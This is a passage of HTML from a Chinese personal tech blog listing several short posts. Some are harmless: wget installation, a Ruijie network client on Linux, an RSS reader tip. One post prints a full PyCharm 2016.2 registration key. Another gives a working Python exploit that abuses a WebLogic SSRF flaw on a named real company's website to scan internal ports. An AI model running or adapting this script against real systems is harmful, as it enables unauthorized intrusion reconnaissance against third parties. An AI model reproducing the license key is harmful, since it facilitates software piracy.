-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h4 id="一、下载"><a href="#一、下载" class="headerlink" title="一、下载"></a>一、下载</h4><p>官网：<a href="http://gnuwin32.sourceforge.net/packages/wget.htm" target="_blank" rel="external">http://gnuwin32.sourceforge.net/packages/wget.htm</a></p>
-<p>下载地址：<a href="http://downloads.sourceforge.net/gnuwin32/wget-1.11.4-1-setup.exe" target="_blank" rel="external">http://downloads.sourceforge.net/gnuwin32/wget-1.11.4-1-setup.exe</a></p>
-<h4 id="二、安装与系统环境变量配置"><a href="#二、安装与系统环境变量配置" class="headerlink" title="二、安装与系统环境变量配置"></a>二、安装与系统环境变量配置</h4><h5 id="2-1-安装"><a href="#2-1-安装" class="headerlink" title="2.1 安装"></a>2.1 安装</h5><p>双击一步步安装即可</p>
-<h5 id="2-2-配置系统环境变量"><a href="#2-2-配置系统环境变量" class="headerlink" title="2.2 配置系统环境变量"></a>2.2 配置系统环境变量</h5><p>在“Path”变量中添加：<code>;E:\DevTools\GnuWin32\bin</code></p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="http://zer0yu.github.io/2017/01/22/PyCharm2016-2专业版注册码/">
-
-  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <meta itemprop="name" content="ZEROYU">
-    <meta itemprop="description" content="">
-    <meta itemprop="image" content="/images/avatar.gif">
-  </span>
-
-  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="ZEROYU">
-    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
-      <img style="display:none;" itemprop="url image" alt="ZEROYU" src="">
-    </span>
-  </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2017/01/22/PyCharm2016-2专业版注册码/" itemprop="url">
-                  PyCharm2016.2专业版注册码
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-01-22T10:48:28+08:00">
-                2017-01-22
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/2017/01/22/PyCharm2016-2专业版注册码/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/01/22/PyCharm2016-2专业版注册码/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-
-          
-          
-             <span id="/2017/01/22/PyCharm2016-2专业版注册码/" class="leancloud_visitors" data-flag-title="PyCharm2016.2专业版注册码">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <figure class="highlight llvm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="number">43</span>B<span class="number">4</span>A<span class="number">73</span>YYJ-eyJsaWNlbnNlSWQiOiI<span class="number">0</span>M<span class="number">0</span>I<span class="number">0</span>QTczWVlKIiwibGljZW<span class="number">5</span>zZWVOYW<span class="number">1</span>lIjoibGFuIHl<span class="number">1</span>IiwiYXNza</div><div class="line">WduZWVOYW<span class="number">1</span>lIjoiIiwiYXNzaWduZWVFbWFpbCI<span class="number">6</span>IiIsImxpY<span class="number">2</span>Vuc<span class="number">2</span>VSZXN<span class="number">0</span>cmljdGlvbiI<span class="number">6</span>IkZvciBlZHVj</div><div class="line">YXRpb<span class="number">25</span>hbCB<span class="number">1</span><span class="keyword">c</span><span class="number">2</span>Ugb<span class="number">25</span>seSIsImNoZWNrQ<span class="number">29</span>uY<span class="number">3</span>VycmVudFVzZSI<span class="number">6</span>ZmFsc<span class="number">2</span>UsInByb<span class="number">2</span>R<span class="number">1</span>Y<span class="number">3</span>RzIjpbeyJjb</div><div class="line"><span class="number">2</span>RlIjoiSUkiLCJwYWlkVXBUbyI<span class="number">6</span>IjIwMTctMDItMjUifSx<span class="number">7</span>ImNvZGUiOiJBQyIsInBhaWRVcFRvIjoiMjAxNy<span class="number">0</span></div><div class="line">wM<span class="keyword">i0</span>yNSJ<span class="number">9</span>LHsiY<span class="number">29</span>kZSI<span class="number">6</span>IkRQTiIsInBhaWRVcFRvIjoiMjAxNy<span class="number">0</span>wM<span class="keyword">i0</span>yNSJ<span class="number">9</span>LHsiY<span class="number">29</span>kZSI<span class="number">6</span>IlBTIiwicGFp</div><div class="line">ZFVwVG<span class="number">8</span>iOiIyMDE<span class="number">3</span>LTAyLTI<span class="number">1</span>In<span class="number">0</span>seyJjb<span class="number">2</span>RlIjoiRE<span class="number">0</span>iLCJwYWlkVXBUbyI<span class="number">6</span>IjIwMTctMDItMjUifSx<span class="number">7</span>ImNvZG</div><div class="line">UiOiJDTCIsInBhaWRVcFRvIjoiMjAxNy<span class="number">0</span>wM<span class="keyword">i0</span>yNSJ<span class="number">9</span>LHsiY<span class="number">29</span>kZSI<span class="number">6</span>IlJTMCIsInBhaWRVcFRvIjoiMjAxNy<span class="number">0</span></div><div class="line">wM<span class="keyword">i0</span>yNSJ<span class="number">9</span>LHsiY<span class="number">29</span>kZSI<span class="number">6</span>IlJDIiwicGFpZFVwVG<span class="number">8</span>iOiIyMDE<span class="number">3</span>LTAyLTI<span class="number">1</span>In<span class="number">0</span>seyJjb<span class="number">2</span>RlIjoiUEMiLCJwYWlkV</div><div class="line">XBUbyI<span class="number">6</span>IjIwMTctMDItMjUifSx<span class="number">7</span>ImNvZGUiOiJSTSIsInBhaWRVcFRvIjoiMjAxNy<span class="number">0</span>wM<span class="keyword">i0</span>yNSJ<span class="number">9</span>LHsiY<span class="number">29</span>kZ</div><div class="line">SI<span class="number">6</span>IldTIiwicGFpZFVwVG<span class="number">8</span>iOiIyMDE<span class="number">3</span>LTAyLTI<span class="number">1</span>In<span class="number">0</span>seyJjb<span class="number">2</span>RlIjoiREIiLCJwYWlkVXBUbyI<span class="number">6</span>IjIwMTctMDItM</div><div class="line">jUifSx<span class="number">7</span>ImNvZGUiOiJEQyIsInBhaWRVcFRvIjoiMjAxNy<span class="number">0</span>wM<span class="keyword">i0</span>yNSJ<span class="number">9</span>XSwiaGFzaCI<span class="number">6</span>IjMzOTgyOTkvMCIsI</div><div class="line">mdyYWNlUGVyaW<span class="number">9</span>kRGF<span class="number">5</span>cyI<span class="number">6</span>MCwiYXV<span class="number">0</span>b<span class="number">1</span>Byb<span class="number">2</span>xvbmdhdGVkIjpmYWxzZSwiaXNBdXRvUHJvbG<span class="number">9</span>u</div><div class="line">Z<span class="number">2</span>F<span class="number">0</span>ZWQiOmZhbHNlfQ==-keaxIkRgXPKE<span class="number">4</span>BR/ZTs<span class="number">7</span>s<span class="number">7</span>UkP<span class="number">92</span>LBxRe<span class="number">57</span>HvWamu<span class="number">1</span>EHVXTcV<span class="number">1</span>B<span class="number">4</span>f/KN</div><div class="line">QIrpOpN<span class="number">6</span>dgpjig<span class="number">5</span>eMVMPmo<span class="number">7</span>yMPl+bmwQ<span class="number">8</span>pTZaCGFuLqCHD<span class="number">1</span>ngo<span class="number">6</span>ywHKIQy<span class="number">0</span>nR<span class="number">249</span>sAUVaCl<span class="number">2</span>wGJ</div><div class="line">waO<span class="number">4</span>JeOh<span class="number">1</span>opUx<span class="number">8</span>chzSBVRZBMz<span class="number">0</span>/MGyyg<span class="keyword">i7</span>duYAff<span class="number">9</span>JQqfH<span class="number">3</span>p/BhDTNM<span class="number">8</span>eKl<span class="number">6</span>z<span class="number">5</span>tnneZ<span class="number">8</span>ZG<span class="number">5</span>bG<span class="number">1</span>XvqF</div><div class="line">TqWk<span class="number">4</span>FhGsEWdK<span class="number">7</span>B+He<span class="number">44</span>hPjBxKQl<span class="number">2</span>gmZAodb<span class="number">6</span>g<span class="number">9</span>YxfTHhVRKQY<span class="number">5</span>hQ<span class="number">7</span>KPXNvh<span class="number">3</span>ikerHkoaL<span class="number">5</span>apgsV</div><div class="line">BZJOTDE<span class="number">2</span>KdYTnGLmqxghFx<span class="number">6</span>L<span class="number">0</span>ofqKI<span class="number">6</span>hMr<span class="number">48</span>ergMyflDk<span class="number">6</span>wLNGWJvYHLWw==-MIIEPjCCAiagAwIBA</div><div class="line">gIBBTANBgkqhkiG<span class="number">9</span>w<span class="number">0</span>BAQsFADAYMRYwFAYDVQQDDA<span class="number">1</span>KZXRQcm<span class="number">9</span>maWxlIENBMB<span class="number">4</span>XDTE<span class="number">1</span>MTEwM</div><div class="line">jA<span class="number">4</span>MjE<span class="number">0</span>OFoXDTE<span class="number">4</span>MTEwMTA<span class="number">4</span>MjE<span class="number">0</span>OFowETEPMA<span class="number">0</span>GA<span class="number">1</span>UEAwwGcHJvZDN<span class="number">5</span>MIIBIjANBgkqhkiG<span class="number">9</span>w<span class="number">0</span>B</div><div class="line">AQEFAAOCAQ<span class="number">8</span>AMIIBCgKCAQEAxcQkq+zdxlR<span class="number">2</span>mmRYBPzGbUNdMN<span class="number">6</span>OaXiXzxIWtMEkrJMO/<span class="number">5</span>oUfQJbL</div><div class="line">LuMSMK<span class="number">0</span>QHFmaI<span class="number">37</span>WShyxZcfRCidwXjot<span class="number">4</span>zmNBKnlyHodDij/<span class="number">78</span>TmVqFl<span class="number">8</span>nOeD<span class="number">5</span>+<span class="number">07</span>B<span class="number">8</span>VEaIu<span class="number">7</span><span class="keyword">c</span><span class="number">3E1</span>N</div><div class="line">+e<span class="number">1</span>doC<span class="number">6</span>wht<span class="number">4</span>I<span class="number">4</span>+IEmtsPAdoaj<span class="number">5</span>WCQVQbrI<span class="number">8</span>KeT<span class="number">8</span>M<span class="number">9</span>VcBIWX<span class="number">7</span>fD<span class="number">0</span>fhexfg<span class="number">3</span>ZRt<span class="number">0</span>xqwMcXGNp<span class="number">3</span>DdJHiO<span class="number">0</span></div><div class="line">rCdU+Itv<span class="number">7</span>EmtnSVq<span class="number">9</span>jBG<span class="number">1</span>usMSFvMowR<span class="number">25</span>mju<span class="number">2</span>JcPFp<span class="number">1</span>+I<span class="number">4</span>ZI+FqgR<span class="number">8</span>gyG<span class="number">8</span>oiNDyNEoAbsR<span class="number">3</span>lOpI<span class="number">7</span>grUY</div><div class="line">SvkB/xVy/VoklPCK<span class="number">2</span>h<span class="number">0</span>f<span class="number">0</span>GJxFjnye<span class="number">8</span>NT<span class="number">1</span>PAywoyl<span class="number">7</span>RmiAVRE/EKwIDAQABo<span class="number">4</span>GZMIGWMAkGA<span class="number">1</span>UdEwQ</div><div class="line">CMAAwHQYDVR<span class="number">0</span>OBBYEFGEpG<span class="number">9</span>oZGcfLMGNBkY<span class="number">7</span>SgHiMGgTcMEgGA<span class="number">1</span>UdIwRBMD+AFKOetkhnQhI<span class="number">2</span>Q</div><div class="line">b<span class="number">1</span>t<span class="number">4</span>Lm<span class="number">0</span>oFKLl/GzoRykGjAYMRYwFAYDVQQDDA<span class="number">1</span>KZXRQcm<span class="number">9</span>maWxlIENBggkA<span class="number">0</span>myxg<span class="number">7</span>KDeeEwEwYD</div><div class="line">VR<span class="number">0</span>lBAwwCgYIKwYBBQUHAwEwCwYDVR<span class="number">0</span>PBAQDAgWgMA<span class="number">0</span>GCSqGSIb<span class="number">3</span>DQEBCwUAA<span class="number">4</span>ICAQC<span class="number">9</span>WZuYg</div><div class="line">QedSuOc<span class="number">5</span>TOUSrRigMw<span class="number">4</span>/+wuC<span class="number">5</span>EtZBfvdl<span class="number">4</span>HT/<span class="number">8</span>vzMW/oUlIP<span class="number">4</span>YCvA<span class="number">0</span>XKyBaCJ<span class="number">2</span>iX+ZCDKoPfiYXiaSiH+H</div><div class="line">xAPV<span class="number">6</span>J<span class="number">79</span>vvouxKrWg<span class="number">2</span>XV<span class="number">6</span>ShFtPLP+<span class="number">0</span>gPdGq<span class="number">3</span><span class="keyword">x</span><span class="number">9</span>R<span class="number">3</span>+kJbmAm<span class="number">8</span>w+FOdlWqAfJrLvpzMGNeDU<span class="number">14</span>YGXiZ<span class="number">9</span>b</div><div class="line">VzmIQbwrBA+<span class="keyword">c</span>/F<span class="number">4</span>tlK/DV<span class="number">07</span>dsNExihqFoibnqDiVNTGombaU<span class="number">2</span>dDup<span class="number">2</span>gwKdL<span class="number">81</span>ua<span class="number">8</span>EIcGNExHe<span class="number">82</span>kjF<span class="number">4</span>z</div><div class="line">wfadHk<span class="number">3</span>bQVvbfdAwxcDy<span class="number">4</span>xBjs<span class="number">3</span>L<span class="number">4</span>raPLU<span class="number">3</span>yenSzr/OEur<span class="number">1</span>+jfOxnQSmEcMXKXgrAQ<span class="number">9</span>U<span class="number">55</span>gwjcOFKrgOxE</div><div class="line">dek/Sk<span class="number">1</span>VfOjvS+nuM<span class="number">4</span>eyEruFMfaZHzoQiuw<span class="number">4</span>IqgGc<span class="number">45</span>ohFH<span class="number">0</span>UUyjYcuFxxDSU<span class="number">9</span>lMCv<span class="number">8</span>qdHKm+wnPRb<span class="number">0</span></div><div class="line">l<span class="number">9</span>l<span class="number">5</span>vXsCBDuhAGYD<span class="number">6</span>ss+Ga+aDY<span class="number">6</span>f/qXZuUCEUOH<span class="number">3</span>QUNbbCUlviSz<span class="number">6</span>+GiRnt<span class="number">1</span>kA<span class="number">9</span>N<span class="number">2</span>Qachl+<span class="number">2</span>yBfaqUqr<span class="number">8</span>h</div><div class="line"><span class="number">7</span>Z<span class="number">2</span>gsx<span class="number">5</span>LcIf<span class="number">5</span>kYNsqJ<span class="number">0</span>GavXTVyWh<span class="number">7</span>PYiKX<span class="number">4</span>bs<span class="number">354</span>ZQLUwwa/cG++<span class="number">2</span>+wNWP+HtBhVxMRNTdVhSm<span class="number">38</span>Ak</div><div class="line">nZlD+PTAsWGu<span class="number">9</span>GyLmht<span class="keyword">i2</span>EnVwGybSD<span class="number">2</span>Dxmhxk<span class="number">3</span>IPCkhKAK+pl<span class="number">0</span>eWYGZWG<span class="number">3</span>tJ<span class="number">9</span>mZ<span class="number">7</span>SowcXLWDFAk<span class="number">0</span>lR</div><div class="line">JnKGFMTggrWjV<span class="number">8</span>GYpw<span class="number">5</span>bq<span class="number">23</span>VmIqqDLgkNzuoog==</div></pre></td></tr></table></figure>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="http://zer0yu.github.io/2017/01/22/Linux下使用锐捷的方法/">
-
-  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <meta itemprop="name" content="ZEROYU">
-    <meta itemprop="description" content="">
-    <meta itemprop="image" content="/images/avatar.gif">
-  </span>
-
-  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="ZEROYU">
-    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
-      <img style="display:none;" itemprop="url image" alt="ZEROYU" src="">
-    </span>
-  </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2017/01/22/Linux下使用锐捷的方法/" itemprop="url">
-                  Linux下使用锐捷的方法
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-01-22T10:45:46+08:00">
-                2017-01-22
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/2017/01/22/Linux下使用锐捷的方法/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/01/22/Linux下使用锐捷的方法/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-
-          
-          
-             <span id="/2017/01/22/Linux下使用锐捷的方法/" class="leancloud_visitors" data-flag-title="Linux下使用锐捷的方法">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>其实很简单一个命令就搞定（前提是你有这个<a href="https://pan.baidu.com/s/1bo13wYF" target="_blank" rel="external">脚本</a>）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">#下载之后先解压：</div><div class="line"></div><div class="line">unzip RuijieForLinux.zip</div><div class="line"></div><div class="line">#之后cd 进去</div><div class="line"></div><div class="line">#在然后呢</div><div class="line"></div><div class="line">sudo chmod +x ./rjsupplicant.sh</div><div class="line"></div><div class="line">#再然后呢</div><div class="line"></div><div class="line">sudo ./rjsupplicant.sh -u 你的学号 -p 你的密码 -s 收费资源/免费资源</div></pre></td></tr></table></figure>
-<p>第一次使用时，可以通过 –help命令查看使用帮助文档</p>
-<p>贴个效果图：</p>
-<p><img src="http://ok44mzy2k.bkt.clouddn.com/linux-rj.png" alt="1"></p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="http://zer0yu.github.io/2017/01/22/Weblogic-SSRF/">
-
-  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <meta itemprop="name" content="ZEROYU">
-    <meta itemprop="description" content="">
-    <meta itemprop="image" content="/images/avatar.gif">
-  </span>
-
-  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="ZEROYU">
-    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
-      <img style="display:none;" itemprop="url image" alt="ZEROYU" src="">
-    </span>
-  </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2017/01/22/Weblogic-SSRF/" itemprop="url">
-                  Weblogic_SSRF
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-01-22T10:44:43+08:00">
-                2017-01-22
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/2017/01/22/Weblogic-SSRF/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/01/22/Weblogic-SSRF/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-
-          
-          
-             <span id="/2017/01/22/Weblogic-SSRF/" class="leancloud_visitors" data-flag-title="Weblogic_SSRF">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>Weblogic_SSRF的一个利用脚本</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(ip_str)</span>:</span></div><div class="line"><span class="comment">#元组</span></div><div class="line">ports = (<span class="string">'21'</span>,<span class="string">'22'</span>,<span class="string">'23'</span>,<span class="string">'53'</span>,<span class="string">'80'</span>,<span class="string">'135'</span>,<span class="string">'139'</span>,<span class="string">'443'</span>,<span class="string">'445'</span>,<span class="string">'1080'</span>,<span class="string">'1433'</span>,<span class="string">'1521'</span>,<span class="string">'3306'</span>,<span class="string">'3389'</span>,<span class="string">'4899'</span>,<span class="string">'8080'</span>,<span class="string">'7001'</span>,<span class="string">'8000'</span>,)</div><div class="line"></div><div class="line"><span class="keyword">for</span> port <span class="keyword">in</span> ports:</div><div class="line"><span class="comment"># %d 是整形通配符,%s是字符串通配符</span></div><div class="line">exp_url = <span class="string">"http://www.faw.com.cn/uddiexplorer/SetupUDDIExplorer.jsp?operator=http://%s:%s&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search"</span>%(ip_str,port)</div><div class="line"></div><div class="line"><span class="keyword">try</span>:</div><div class="line"></div><div class="line">response = requests.get(exp_url, timeout=<span class="number">1</span>, verify=<span class="keyword">False</span>)</div><div class="line"></div><div class="line"><span class="keyword">if</span> response.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">'weblogic.uddi.client.structures.exception.XML_SoapException'</span> <span class="keyword">in</span> response.content:</div><div class="line"></div><div class="line"><span class="keyword">print</span> ip_str+<span class="string">':'</span> + port + <span class="string">' --open'</span></div><div class="line"></div><div class="line"><span class="keyword">except</span> Exception, e:</div><div class="line"></div><div class="line"><span class="keyword">pass</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_ip</span><span class="params">(ip_prefix)</span>:</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">190</span>,<span class="number">200</span>):</div><div class="line"></div><div class="line">scan(<span class="string">'%s.%s'</span>%(ip_prefix,i))</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line"></div><div class="line">commandargs = sys.argv[<span class="number">1</span>]</div><div class="line"></div><div class="line">args = <span class="string">""</span>.join(commandargs)<span class="comment">#将列表数据以‘’中的字符链接</span></div><div class="line"></div><div class="line">ip_prefix = <span class="string">'.'</span>.join(args.split(<span class="string">'.'</span>)[:<span class="number">-1</span>])</div><div class="line"></div><div class="line">find_ip(ip_prefix)</div></pre></td></tr></table></figure>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="http://zer0yu.github.io/2017/01/22/RSS阅读器/">
-
-  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <meta itemprop="name" content="ZEROYU">
-    <meta itemprop="description" content="">
-    <meta itemprop="image" content="/images/avatar.gif">
-  </span>
-
-  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="ZEROYU">
-    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
-      <img style="display:none;" itemprop="url image" alt="ZEROYU" src="">
-    </span>
-  </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2017/01/22/RSS阅读器/" itemprop="url">
-                  RSS阅读器
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-01-22T10:42:34+08:00">
-                2017-01-22
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/2017/01/22/RSS阅读器/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/01/22/RSS阅读器/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-
-          
-          
-             <span id="/2017/01/22/RSS阅读器/" class="leancloud_visitors" data-flag-title="RSS阅读器">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>推荐两个个RSS阅读器，免费的。用了好久，很不错。</p>
-<p>1.<a href="http://azreader.net/" target="_blank" rel="external">http://azreader.net/</a></p>
-<p>2.深蓝阅读</p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="http://zer0yu.github.io/2017/01/22/CTF中那些有趣的混淆/">
-
-  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <meta itemprop="name" content="ZEROYU">
-    <meta itemprop="description" content="">
-    <meta itemprop="image" content="/images/avatar.gif">
-  </span>
-
-  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="ZEROYU">
-    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
-      <img style="display:none;" itemprop="url image" alt="ZEROYU" src="">
-    </span>
-  </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2017/01/22/CTF中那些有趣的混淆/" itemprop="url">
-                  CTF中那些有趣的混淆
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
